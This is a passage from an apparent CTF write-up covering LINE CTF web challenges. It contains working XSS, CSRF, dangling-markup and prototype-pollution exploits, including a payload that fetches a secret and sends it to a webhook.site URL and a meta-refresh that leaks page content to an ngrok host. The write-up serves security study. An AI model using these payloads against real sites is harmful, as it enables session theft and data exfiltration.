    <span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token function">getUrl</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      w<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>

  <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token string">'LINECTF&#123;'</span>
  <span class="token keyword">const</span> charset <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>
  <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> charset<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">const</span> str <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token string">"."</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> c
        <span class="token function">visit</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>
        <span class="token keyword">await</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>

  <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  

</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Apart from this solution, another more powerful one is to directly create an XSS using the original functionality. The structure of each note is as follows:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rotate-1 yellow-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;content&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Suppose I create two notes. The first one has the content <code>&quot; id=a x=&quot;</code>, and the second one has <code>LINECTF&#123;rotate-1 yellow-bg&quot;&#125;</code>.</p>
<p>The HTML content will become:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rotate-1 yellow-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>" id=a x="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rotate-1 yellow-bg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>LINECTF&#123;rotate-1 yellow-bg"&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Actually, <code>&quot;</code> will also be encoded on the backend, so if you look at the source, you’ll see <code>&amp;#34;</code>. But if you use <code>document.body.innerHTML</code>, the browser may not encode it, so you’ll see double quotes instead of <code>&amp;#34;</code>. So, the encoding of double quotes doesn’t work.</p>
<p>Then, the extension intervenes and replaces <code>rotate-1 yellow-bg&quot;</code> with something like <code>***</code>, resulting in:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xxx>
    &lt;p><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>a</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;/p>
  &lt;/div>
&lt;/li>
&lt;li>
  &lt;div class=<span class="token punctuation">"</span></span><span class="token attr-name">xxx</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>LINECTF&#123;xxx&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Adjusting the new structure a bit:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xxx>&lt;p><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>a</span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;/p>&lt;/div>&lt;/li>&lt;li>&lt;div class=<span class="token punctuation">"</span></span> <span class="token attr-name">xxx</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>LINECTF&#123;xxx&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The first double quote is replaced, combined with the double quote at the beginning of the original content, and the <code>x=&quot;</code> at the end is combined with the next one. The <code>id=a</code> in the middle becomes part of the attribute.</p>
<p>In other words, we can insert any attribute into the div and use the focus function to create an XSS. Here’s the payload that Renwa gave me in Discord:</p>
<pre class="line-numbers language-none"><code class="language-none">note 1:
&quot;tabindex&#x3D;&quot;1&quot;onfocus&#x3D;&quot;eval(window.name)&quot;style&#x3D;&quot;position:relative;height: 20000px; width: 20008px;&quot;autofocus&#x3D;&quot;1&quot;id&#x3D;&quot;jj&quot;x&#x3D;&quot;

note 2:
LINECTF&#123;rotate-1 yellow-bg&quot;&#125;

Report:
@domain.wtf&#x2F;0ff.html

Contents of 0ff.html:
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;body&gt;
&lt;img src&#x3D;http:&#x2F;&#x2F;httpstat.us&#x2F;200?sleep&#x3D;5000&gt;
&lt;script&gt;
var x&#x3D; window.open(&#39;http:&#x2F;&#x2F;web:3000&#x2F;8be526fd-e193-436c-a431-84141a0903b9&#39;,&#39;fetch(&#96;http:&#x2F;&#x2F;web:8000&#x2F;&#96;,&#123;credentials: &quot;same-origin&quot;&#125;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&#96;https:&#x2F;&#x2F;webhook.site&#x2F;603ab026-5a65-432f-a894-5d981fd24198?flag&#x3D;$&#123;btoa(x)&#125;&#96;))&#39;);
setTimeout(function()&#123;
x.location&#x3D;&#39;http:&#x2F;&#x2F;web:8000&#x2F;8be526fd-e193-436c-a431-84141a0903b9#jj&#39;
&#125;,500)

&lt;&#x2F;script&gt;


&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>I didn’t think of this solution at the time. It’s really amazing.</p>
<h2><span id="another-secure-store-note-7-solves">Another Secure Store Note (7 solves)</span></h2><p>This challenge had a feature to change the name, and the name would be directly reflected on the screen, creating a free XSS. However, the problem was that changing the name required checking the CSRF token. There was a file called <code>getSettings.js</code> that had the CSRF token:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">isInWindowContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> tmp <span class="token operator">=</span> self<span class="token punctuation">;</span>
  self <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// magic</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">this</span> <span class="token operator">!==</span> self<span class="token punctuation">)</span><span class="token punctuation">;</span>
  self <span class="token operator">=</span> tmp<span class="token punctuation">;</span>
  <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// Ensure it is in window context with correct domain only :)</span>
<span class="token comment">// Setting up variables and UI</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isInWindowContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> document<span class="token punctuation">.</span>domain <span class="token operator">===</span> <span class="token string">'&lt;%= domain %>'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> urlParams <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>search<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerText <span class="token operator">=</span> urlParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'_csrf'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'&lt;%= csrf %>'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Here, it checks whether it is in the window context and <code>document.domain</code>. When I saw this, I immediately thought of the Intigriti XSS challenge in October 2022. The author’s writeup is here: <a target="_blank" rel="noopener" href="https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md">https://github.com/0xGodson/blogs/blob/master/_posts/2022-10-14-intigriti-oct-xss-challenge-author-writeup.md</a></p>
<p>One part of the challenge uses a web worker to bypass the check on <code>window.location.href</code> and <code>document.domain</code>, like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// worker.js</span>

window <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
document <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token comment">// send the secret to top window!</span>
window<span class="token punctuation">.</span><span class="token function-variable function">saveSecret</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  
  self<span class="token punctuation">.</span><span class="token function">postMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  
<span class="token punctuation">&#125;</span>

window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token string">"https://challenge-1022.intigriti.io/challenge/create"</span><span class="token punctuation">;</span>
document<span class="token punctuation">.</span>domain <span class="token operator">=</span> <span class="token string">"challenge-1022.intigriti.io"</span><span class="token punctuation">;</span>

<span class="token comment">// we can use importScripts function from API to import external scripts!</span>
<span class="token function">importScripts</span><span class="token punctuation">(</span><span class="token string">"https://challenge-1022.intigriti.io/challenge/getSecret.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>So this challenge specifically checks the context to try to block this, but fortunately when I was researching Intigriti, I found that <code>document.domain</code> can actually be overridden using <code>Object.defineProperty</code>, so CSRF can be done like this:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>document<span class="token punctuation">,</span> <span class="token string">'domain'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token string">'35.200.57.143'</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_csrf<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://35.200.57.143:11004/getSettings.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>POST</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://35.200.57.143:11004/profile<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrf<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">const</span> csrf <span class="token operator">=</span> _csrf<span class="token punctuation">.</span>value
  f<span class="token punctuation">.</span>csrf<span class="token punctuation">.</span>value <span class="token operator">=</span> csrf
  f<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Next is to steal the nonce. This challenge uses Firefox, and it doesn’t seem to have much protection against Dangling Markup Injection, which can be used to steal the following content using meta redirect: <code>&lt;meta http-equiv=refresh content=&#39;0; url=http://43d1-ip.ngrok.io/steal?q=</code></p>
<p>The final step is to prevent the loading of <code>csp.gif</code>, because if this is loaded, the nonce will change. I spent an hour and a half trying to figure out how to block it, and originally thought that the previously mentioned concurrent limit could be used to prevent it, but no matter how I tried, it didn’t work.</p>
<p>Finally, I found that the original <code>base-uri</code> was <code>self</code>, so the base could be used, wasting an hour QQ</p>
<h2><span id="momomomomemomemo-3-solves">Momomomomemomemo (3 solves)</span></h2><p>This challenge was solved by my teammate and is quite interesting. Basically, the frontend will use GraphQL to fetch results based on the id you provide:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">memo</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> query <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">query &#123; 
        memo (
            id: "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">", 
            token: "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">") &#123;
                content
            &#125; 
        &#125;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#query</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>In the final query part, <a target="_blank" rel="noopener" href="https://www.apollographql.com/docs/apollo-server/performance/apq/">persisted queries</a> are used. Basically, you send the hash of the query first, and if it has been executed before, the result will be sent back directly.</p>
<p>Otherwise, if it hasn’t, you send the hash + query again, and the backend caches the result. The frontend implementation is like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">async <span class="token function">#query</span><span class="token punctuation">(</span><span class="token parameter">query</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> hash <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">#getQueryHash</span><span class="token punctuation">(</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>endpoint <span class="token operator">+</span>
            <span class="token string">"?"</span> <span class="token operator">+</span>
            <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                <span class="token literal-property property">extensions</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    <span class="token literal-property property">persistedQuery</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">version</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token literal-property property">sha256Hash</span><span class="token operator">:</span> hash <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#123;</span>
            <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> res<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>errors<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>data<span class="token punctuation">.</span>errors<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>extensions<span class="token punctuation">.</span>code <span class="token operator">==</span> <span class="token string">"PERSISTED_QUERY_NOT_FOUND"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>endpoint<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
                <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
                <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token string-property property">"Content-type"</span><span class="token operator">:</span> <span class="token string">"application/json"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
                    query<span class="token punctuation">,</span>
                    <span class="token literal-property property">extensions</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                        <span class="token literal-property property">persistedQuery</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                            <span class="token literal-property property">version</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                            <span class="token literal-property property">sha256Hash</span><span class="token operator">:</span> hash<span class="token punctuation">,</span>
                        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>The frontend also uses the Purl library, so there is also prototype pollution that can be used, but what can be polluted in this challenge? The answer is in this section:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> purl <span class="token operator">=</span> window<span class="token punctuation">.</span>purl

<span class="token keyword">const</span> memoId <span class="token operator">=</span> <span class="token function">purl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> gql <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GraphQL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>origin<span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">GraphQL</span> <span class="token punctuation">&#123;</span>
    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">host<span class="token punctuation">,</span> option <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>endpoint <span class="token operator">=</span> host <span class="token operator">+</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>endpoint <span class="token operator">+=</span> option<span class="token punctuation">.</span>path <span class="token operator">||</span> <span class="token string">"graphql"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// ...</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>You can pollute the path, which can manipulate <code>option.path</code>, but what can be done with this? This is related to the backend’s i18n logic, implemented as follows:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// simple i18n</span>
